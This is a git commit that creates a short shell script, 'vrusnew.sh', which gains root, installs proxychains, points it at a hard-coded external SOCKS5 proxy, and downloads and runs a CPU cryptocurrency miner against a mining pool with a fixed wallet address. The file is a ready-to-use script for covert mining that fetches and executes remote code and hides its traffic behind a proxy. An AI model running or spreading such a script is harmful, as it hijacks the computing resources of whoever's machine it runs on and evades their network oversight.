46bd962d0c2a918c9fb99287d7f859e4780da0a9
angkii <83603708+angkii@users.noreply.github.com>
2022-01-20 14:40:37 +0700

    Create vrusnew.sh

---
+++ vrusnew.sh
@@ -0,0 +1,13 @@
+sudo -i
+
+apt update
+
+apt install proxychains
+
+sed -i 's/socks4/socks5/' /etc/proxychains.conf
+
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+
+sed -i 's/9050/10663/' /etc/proxychains.conf
+
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && proxychains ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RF5xRYxdXryTYErYHxiiHUK9846ZX48XaU.wangsit -p x --cpu 8
